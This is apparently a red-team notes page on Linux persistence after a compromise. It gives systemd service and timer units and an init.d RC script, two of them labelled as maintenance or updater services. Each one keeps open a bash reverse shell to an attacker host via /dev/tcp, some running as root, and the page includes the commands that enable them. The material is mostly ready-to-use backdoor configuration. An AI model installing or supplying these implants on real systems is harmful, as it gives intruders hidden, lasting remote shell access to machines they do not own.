---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Living off the Land

## 01 - Systemd

### 1.1 - Service

Non-elevated system daemon.

```
$ cat /etc/systemd/system/maintenance-check.service
[Unit]
Description=Maintenance Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<IP>/<PORT> 0>&1'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

Elevated system daemon.

```
$ cat /etc/systemd/system/rooted-backdoor.service
[Unit]
Description=Backdoor service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<IP>/<PORT> 0>&1'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

Reload all daemon services

```
$ sudo systemctl daemon-reload
```

Enable service daemon.

```
$ sudo systemctl enable implant.service
```

### 1.2 - Timer

Create a timer.

```
$ nano ~/.config/systemd/user/implant.timer
[Unit]
Description="Updater Service"

[Timer]
OnBootSec=1min
OnUnitActiveSec=24h
OnCalendar=Mon..Fir *-*-* 09:06:*
Unit=implant.service

[Install]
WantedBy=multi-user.target
```

Once the timer has been created then create a service and specify a path for the implant. Then wait for the service to detonate it.

```
$ nano ~/.config/systemd/user/implant.service
[Unit]
Description="Updater script"

[Service]
ExecStart=/path/to/implant.sh
```

## 02 - RC Scripts

Elevated RC script.

```bash
#!/bin/bash

implant() {
	while true
	do
		bash -c 'exec bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' &
		sleep 30
	done
}

case "$1" in
	start)
		implant
		;;
	stop)
		pkill -f "bash -c exec bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1"
		;;
	restart)
		$0 stop
		$0 start
		;;
	*)
		echo "Usage $0 {start|stop|restart}"
		exit 1
esac

exit 0
```

Make the script executable and then enable it.

```
$ sudo chmod 755 /etc/init.d/implant

$ sudo update-rc.d implant defaults
```

---
## References

### Backlinks

- [[03 - Malware Development/Global Helpers/Persistence/Linux/Autostart Locations]]

- [[Linux Post Exploitation Persistence References]]

### DMCXBlue

- [DMCXBlue: Systemd Service](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1543-create-or-modify-system-process/systemd-service)

- [DMCXBlue: RC Scripts](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1037-boot-or-logon-initialization-scripts/rc-scripts)

- [DMCXBlue: Systemd Timers](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1053-scheduled-tasks-job/systemd-timers)